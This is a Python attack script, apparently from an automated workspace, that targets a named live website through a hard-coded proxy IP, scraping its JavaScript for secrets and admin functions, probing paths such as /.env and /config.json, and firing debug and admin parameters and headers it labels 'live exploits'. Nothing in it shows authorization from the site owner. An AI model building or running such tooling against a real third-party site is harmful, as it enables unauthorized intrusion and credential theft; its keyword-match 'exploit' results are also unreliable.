#!/usr/bin/env python3

import requests
import urllib3
import json
import re
import base64
import hashlib
import time
import subprocess
from urllib.parse import urljoin, urlparse, unquote
from bs4 import BeautifulSoup
import ast

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
TARGET_URL = "https://pigslot.co/"

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")
def print_critical(message): print(f"\033[1;35m[!!!] {message}\033[0m")

class ComprehensiveJSDebugAnalyzer:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        self.vulnerabilities = []
        self.js_files = []
        self.debug_endpoints = []
        self.secrets_found = []
        self.exploit_vectors = []
        
    def discover_all_js_files(self):
        """Discover all JavaScript files from various sources"""
        print_critical("🔍 DISCOVERING ALL JAVASCRIPT FILES")
        print_info("=" * 70)
        
        js_files = set()
        
        # 1. Get from main page
        try:
            response = self.session.get(TARGET_URL, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Script tags
                for script in soup.find_all('script', src=True):
                    js_url = urljoin(TARGET_URL, script['src'])
                    js_files.add(js_url)
                
                # Inline scripts with external references
                for script in soup.find_all('script'):
                    if script.string:
                        # Look for dynamic script loading
                        js_refs = re.findall(r'["\']([^"\']*\.js[^"\']*)["\']', script.string)
                        for ref in js_refs:
                            if ref.startswith('/') or ref.startswith('http'):
                                js_url = urljoin(TARGET_URL, ref)
                                js_files.add(js_url)
                
        except Exception as e:
            print_error(f"Error getting main page: {e}")
        
        # 2. Try common Next.js paths
        next_paths = [
            "/_next/static/chunks/webpack.js",
            "/_next/static/chunks/main.js", 
            "/_next/static/chunks/polyfills.js",
            "/_next/static/chunks/framework.js",
            "/_next/static/chunks/pages/_app.js",
            "/_next/static/chunks/pages/_error.js",
            "/_next/static/chunks/pages/index.js",
        ]
        
        for path in next_paths:
            js_url = urljoin(TARGET_URL, path)
            js_files.add(js_url)
        
        # 3. Discover from build manifests
        manifest_urls = [
            "/_next/static/chunks/_buildManifest.js",
            "/_next/static/_buildManifest.js",
            "/_next/static/buildManifest.js",
        ]
        
        for manifest_url in manifest_urls:
            try:
                response = self.session.get(urljoin(TARGET_URL, manifest_url), timeout=5)
                if response.status_code == 200:
                    # Extract file references from manifest
                    content = response.text
                    js_refs = re.findall(r'["\']([^"\']*\.js[^"\']*)["\']', content)
                    for ref in js_refs:
                        if 'static/' in ref:
                            js_url = urljoin(TARGET_URL, f"/_next/{ref}")
                            js_files.add(js_url)
            except:
                pass
        
        # 4. Common game/admin related JS files
        game_paths = [
            "/js/game.js",
            "/js/admin.js", 
            "/js/config.js",
            "/js/debug.js",
            "/js/api.js",
            "/static/js/game.js",
            "/static/js/admin.js",
            "/assets/js/game.js",
            "/assets/js/admin.js",
        ]
        
        for path in game_paths:
            js_url = urljoin(TARGET_URL, path)
            js_files.add(js_url)
        
        self.js_files = list(js_files)
        print_success(f"📁 Found {len(self.js_files)} potential JavaScript files")
        
        return self.js_files
    
    def decode_and_analyze_js(self, js_url):
        """Download, decode and analyze JavaScript file"""
        print_info(f"🔍 Analyzing: {js_url}")
        
        try:
            response = self.session.get(js_url, timeout=10)
            if response.status_code != 200:
                return None
                
            content = response.text
            print_info(f"   📄 Size: {len(content)} bytes")
            
            # Basic deobfuscation attempts
            decoded_content = self.deobfuscate_js(content)
            
            # Analyze for vulnerabilities
            analysis = {
                'url': js_url,
                'size': len(content),
                'original_content': content,
                'decoded_content': decoded_content,
                'vulnerabilities': [],
                'secrets': [],
                'debug_info': [],
                'api_endpoints': [],
                'admin_functions': []
            }
            
            # Deep analysis
            analysis = self.analyze_js_content(analysis)
            
            return analysis
            
        except Exception as e:
            print_error(f"   ❌ Error analyzing {js_url}: {e}")
            return None
    
    def deobfuscate_js(self, content):
        """Attempt to deobfuscate JavaScript code"""
        decoded = content
        
        # 1. URL decode
        if '%' in decoded:
            try:
                decoded = unquote(decoded)
            except:
                pass
        
        # 2. Base64 decode patterns
        b64_patterns = re.findall(r'["\']([A-Za-z0-9+/]{20,}={0,2})["\']', decoded)
        for pattern in b64_patterns:
            try:
                decoded_b64 = base64.b64decode(pattern).decode('utf-8', 'ignore')
                if decoded_b64.isprintable() and len(decoded_b64) > 10:
                    decoded = decoded.replace(pattern, f"/* BASE64_DECODED: {decoded_b64} */")
            except:
                pass
        
        # 3. Hex decode patterns  
        hex_patterns = re.findall(r'["\']([0-9a-fA-F]{10,})["\']', decoded)
        for pattern in hex_patterns:
            try:
                if len(pattern) % 2 == 0:
                    decoded_hex = bytes.fromhex(pattern).decode('utf-8', 'ignore')
                    if decoded_hex.isprintable() and len(decoded_hex) > 5:
                        decoded = decoded.replace(pattern, f"/* HEX_DECODED: {decoded_hex} */")
            except:
                pass
        
        # 4. Simple character replacements
        replacements = {
            '\\x': '',
            '\\u': '',
            '\\"': '"',
            "\\'": "'",
        }
        
        for old, new in replacements.items():
            decoded = decoded.replace(old, new)
        
        return decoded
    
    def analyze_js_content(self, analysis):
        """Deep content analysis for vulnerabilities"""
        content = analysis['decoded_content']
        
        # 1. Debug Information Detection
        debug_patterns = [
            r'debug\s*[:=]\s*true',
            r'DEBUG\s*[:=]\s*true', 
            r'console\.log\s*\(',
            r'console\.debug\s*\(',
            r'console\.warn\s*\(',
            r'console\.error\s*\(',
            r'debugger\s*;',
            r'\.debug\s*\(',
            r'debugging\s*[:=]',
            r'DEVELOPMENT\s*[:=]\s*true',
            r'NODE_ENV.*development',
        ]
        
        for pattern in debug_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                analysis['debug_info'].append({
                    'pattern': pattern,
                    'match': match.group(),
                    'position': match.start()
                })
        
        # 2. Secret Detection
        secret_patterns = [
            r'api[_-]?key\s*[:=]\s*["\'][^"\']{10,}["\']',
            r'secret[_-]?key\s*[:=]\s*["\'][^"\']{10,}["\']',
            r'password\s*[:=]\s*["\'][^"\']{3,}["\']',
            r'token\s*[:=]\s*["\'][^"\']{10,}["\']',
            r'auth[_-]?token\s*[:=]\s*["\'][^"\']{10,}["\']',
            r'access[_-]?token\s*[:=]\s*["\'][^"\']{10,}["\']',
            r'jwt[_-]?token\s*[:=]\s*["\'][^"\']{10,}["\']',
            r'private[_-]?key\s*[:=]\s*["\'][^"\']{10,}["\']',
            r'admin[_-]?pass\s*[:=]\s*["\'][^"\']{3,}["\']',
            r'db[_-]?password\s*[:=]\s*["\'][^"\']{3,}["\']',
            r'database[_-]?url\s*[:=]\s*["\'][^"\']{10,}["\']',
        ]
        
        for pattern in secret_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                analysis['secrets'].append({
                    'type': 'potential_secret',
                    'pattern': pattern,
                    'match': match.group(),
                    'position': match.start()
                })
        
        # 3. API Endpoint Detection
        api_patterns = [
            r'["\']https?://[^"\']+/api/[^"\']+["\']',
            r'["\']/?api/[^"\']+["\']',
            r'["\']/?admin/[^"\']+["\']',
            r'fetch\s*\(\s*["\'][^"\']+["\']',
            r'axios\.[get|post|put|delete]+\s*\(\s*["\'][^"\']+["\']',
            r'\.post\s*\(\s*["\'][^"\']+["\']',
            r'\.get\s*\(\s*["\'][^"\']+["\']',
        ]
        
        for pattern in api_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                endpoint = re.search(r'["\']([^"\']+)["\']', match.group())
                if endpoint:
                    analysis['api_endpoints'].append({
                        'endpoint': endpoint.group(1),
                        'context': match.group(),
                        'position': match.start()
                    })
        
        # 4. Admin Function Detection
        admin_patterns = [
            r'function\s+[^(]*admin[^(]*\s*\(',
            r'[a-zA-Z_$][a-zA-Z0-9_$]*admin[a-zA-Z0-9_$]*\s*[:=]\s*function',
            r'admin[a-zA-Z0-9_$]*\s*:\s*function',
            r'["\']admin["\']?\s*:\s*\{',
            r'isAdmin\s*[:=]',
            r'hasAdminAccess\s*[:=]',
            r'checkAdmin\s*[:=]',
            r'adminLogin\s*[:=]',
            r'adminAuth\s*[:=]',
        ]
        
        for pattern in admin_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                analysis['admin_functions'].append({
                    'function': match.group(),
                    'position': match.start(),
                    'context': content[max(0, match.start()-50):match.end()+50]
                })
        
        return analysis
    
    def test_debug_endpoints(self, analysis):
        """Test discovered debug endpoints for exploitability"""
        print_info(f"🎯 Testing debug endpoints from {analysis['url']}")
        
        test_endpoints = []
        
        # Extract potential endpoints from API analysis
        for api in analysis['api_endpoints']:
            endpoint = api['endpoint']
            if any(debug_term in endpoint.lower() for debug_term in ['debug', 'test', 'dev', 'admin']):
                test_endpoints.append(endpoint)
        
        # Common debug endpoints to test
        common_debug = [
            '/api/debug',
            '/api/debug/info',
            '/api/debug/status',
            '/api/debug/config',
            '/debug',
            '/debug/info',
            '/debug/config',
            '/test',
            '/dev',
            '/.env',
            '/config.json',
            '/debug.json',
        ]
        
        test_endpoints.extend(common_debug)
        
        exploitable_endpoints = []
        
        for endpoint in test_endpoints:
            try:
                if not endpoint.startswith('http'):
                    test_url = urljoin(TARGET_URL, endpoint)
                else:
                    test_url = endpoint
                
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    # Check if response contains sensitive info
                    sensitive_indicators = [
                        'password', 'token', 'secret', 'key', 'config',
                        'database', 'admin', 'debug', 'error', 'stack'
                    ]
                    
                    response_lower = response.text.lower()
                    found_indicators = [ind for ind in sensitive_indicators if ind in response_lower]
                    
                    if found_indicators:
                        exploitable_endpoints.append({
                            'endpoint': test_url,
                            'status': response.status_code,
                            'size': len(response.text),
                            'indicators': found_indicators,
                            'content_preview': response.text[:500]
                        })
                        print_warning(f"   🚨 Potentially exploitable: {test_url}")
                        print_warning(f"      Indicators: {', '.join(found_indicators)}")
                
            except Exception as e:
                continue
        
        return exploitable_endpoints
    
    def test_prototype_pollution(self, analysis):
        """Test for prototype pollution vulnerabilities"""
        print_info("🧪 Testing for Prototype Pollution")
        
        # Look for vulnerable patterns in JS
        pollution_patterns = [
            r'Object\.assign\s*\(',
            r'\.hasOwnProperty\s*\(',
            r'for\s*\(\s*.*\s+in\s+.*\)',
            r'JSON\.parse\s*\(',
            r'eval\s*\(',
            r'Function\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
        ]
        
        vulnerabilities = []
        content = analysis['decoded_content']
        
        for pattern in pollution_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                context = content[max(0, match.start()-100):match.end()+100]
                
                # Check for lack of hasOwnProperty checks
                if 'hasOwnProperty' not in context and 'for' in match.group().lower():
                    vulnerabilities.append({
                        'type': 'potential_prototype_pollution',
                        'pattern': match.group(),
                        'context': context,
                        'position': match.start(),
                        'severity': 'medium'
                    })
        
        return vulnerabilities
    
    def test_xss_vectors(self, analysis):
        """Test for XSS vulnerabilities in JS"""
        print_info("🧪 Testing for XSS Vectors")
        
        xss_patterns = [
            r'innerHTML\s*[=+]',
            r'outerHTML\s*[=+]',
            r'document\.write\s*\(',
            r'document\.writeln\s*\(',
            r'eval\s*\(',
            r'Function\s*\(',
            r'setTimeout\s*\(\s*["\'][^"\']*["\']',
            r'setInterval\s*\(\s*["\'][^"\']*["\']',
            r'location\.href\s*=',
            r'location\.replace\s*\(',
            r'window\.open\s*\(',
        ]
        
        vulnerabilities = []
        content = analysis['decoded_content']
        
        for pattern in xss_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                context = content[max(0, match.start()-100):match.end()+100]
                
                # Check if user input might be involved
                user_input_indicators = ['params', 'query', 'input', 'value', 'data', 'user']
                if any(indicator in context.lower() for indicator in user_input_indicators):
                    vulnerabilities.append({
                        'type': 'potential_xss',
                        'pattern': match.group(),
                        'context': context,
                        'position': match.start(),
                        'severity': 'high'
                    })
        
        return vulnerabilities
    
    def test_live_exploits(self, exploitable_endpoints):
        """Test live exploits on discovered endpoints"""
        print_critical("🎯 TESTING LIVE EXPLOITS")
        print_info("=" * 70)
        
        successful_exploits = []
        
        for endpoint_info in exploitable_endpoints:
            endpoint = endpoint_info['endpoint']
            print_info(f"🔥 Testing live exploit on: {endpoint}")
            
            # Test common exploit payloads
            exploit_tests = [
                # Info disclosure tests
                {'path': '', 'headers': {}, 'expected': ['config', 'secret', 'password']},
                {'path': '?debug=1', 'headers': {}, 'expected': ['debug', 'error', 'stack']},
                {'path': '?config=1', 'headers': {}, 'expected': ['config', 'database', 'key']},
                {'path': '?admin=1', 'headers': {}, 'expected': ['admin', 'user', 'privilege']},
                
                # Header injection tests  
                {'path': '', 'headers': {'X-Debug': '1'}, 'expected': ['debug']},
                {'path': '', 'headers': {'X-Admin': '1'}, 'expected': ['admin']},
                {'path': '', 'headers': {'X-Test': '1'}, 'expected': ['test']},
                
                # POST data tests
                {'method': 'POST', 'data': {'debug': '1'}, 'expected': ['debug']},
                {'method': 'POST', 'data': {'admin': '1'}, 'expected': ['admin']},
            ]
            
            for test in exploit_tests:
                try:
                    test_url = endpoint + test.get('path', '')
                    method = test.get('method', 'GET')
                    headers = test.get('headers', {})
                    data = test.get('data', None)
                    
                    if method == 'POST':
                        response = self.session.post(test_url, headers=headers, data=data, timeout=5)
                    else:
                        response = self.session.get(test_url, headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        response_lower = response.text.lower()
                        found_indicators = [exp for exp in test['expected'] if exp in response_lower]
                        
                        if found_indicators:
                            successful_exploits.append({
                                'endpoint': test_url,
                                'method': method,
                                'headers': headers,
                                'data': data,
                                'response_size': len(response.text),
                                'indicators_found': found_indicators,
                                'response_preview': response.text[:1000],
                                'severity': 'high' if len(found_indicators) > 1 else 'medium'
                            })
                            print_success(f"   ✅ Exploit successful! Found: {', '.join(found_indicators)}")
                        
                except Exception as e:
                    continue
        
        return successful_exploits
    
    def generate_comprehensive_report(self):
        """Generate comprehensive vulnerability report"""
        print_critical("📊 GENERATING COMPREHENSIVE VULNERABILITY REPORT")
        print_info("=" * 70)
        
        # Discover all JS files
        self.discover_all_js_files()
        
        all_analyses = []
        all_exploitable_endpoints = []
        all_vulnerabilities = []
        all_successful_exploits = []
        
        # Analyze each JS file
        for js_url in self.js_files:
            analysis = self.decode_and_analyze_js(js_url)
            if analysis:
                all_analyses.append(analysis)
                
                # Test debug endpoints from this file
                exploitable = self.test_debug_endpoints(analysis)
                all_exploitable_endpoints.extend(exploitable)
                
                # Test for prototype pollution
                pollution_vulns = self.test_prototype_pollution(analysis)
                all_vulnerabilities.extend(pollution_vulns)
                
                # Test for XSS
                xss_vulns = self.test_xss_vectors(analysis)  
                all_vulnerabilities.extend(xss_vulns)
        
        # Test live exploits
        if all_exploitable_endpoints:
            successful_exploits = self.test_live_exploits(all_exploitable_endpoints)
            all_successful_exploits.extend(successful_exploits)
        
        # Generate final report
        report = {
            'total_js_files': len(self.js_files),
            'analyzed_files': len(all_analyses),
            'total_vulnerabilities': len(all_vulnerabilities),
            'exploitable_endpoints': len(all_exploitable_endpoints), 
            'successful_exploits': len(all_successful_exploits),
            'analyses': all_analyses,
            'vulnerabilities': all_vulnerabilities,
            'exploitable_endpoints': all_exploitable_endpoints,
            'successful_exploits': all_successful_exploits
        }
        
        return report

def main():
    print_critical("🎯 COMPREHENSIVE JAVASCRIPT DEBUG & VULNERABILITY ANALYZER")
    print_info("Target: https://pigslot.co")
    print_info("=" * 70)
    
    analyzer = ComprehensiveJSDebugAnalyzer()
    report = analyzer.generate_comprehensive_report()
    
    # Print summary
    print_critical("📊 FINAL SUMMARY")
    print_info("=" * 50)
    print_info(f"📁 Total JS Files Found: {report['total_js_files']}")
    print_info(f"🔍 Files Successfully Analyzed: {report['analyzed_files']}")
    print_info(f"🚨 Total Vulnerabilities: {report['total_vulnerabilities']}")
    print_info(f"🎯 Exploitable Endpoints: {report['exploitable_endpoints']}")
    print_info(f"💥 Successful Live Exploits: {report['successful_exploits']}")
    
    # Show successful exploits
    if report['successful_exploits']:
        print_critical("💥 SUCCESSFUL LIVE EXPLOITS FOUND!")
        for exploit in report['successful_exploits']:
            print_warning(f"🔥 {exploit['endpoint']}")
            print_warning(f"   Method: {exploit['method']}")
            print_warning(f"   Indicators: {', '.join(exploit['indicators_found'])}")
            print_warning(f"   Severity: {exploit['severity'].upper()}")
    else:
        print_success("✅ No immediately exploitable vulnerabilities found")
    
    # Save detailed report
    with open('/workspace/comprehensive_js_debug_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print_info("📄 Detailed report saved to: comprehensive_js_debug_report.json")
    
    return report

if __name__ == "__main__":
    main()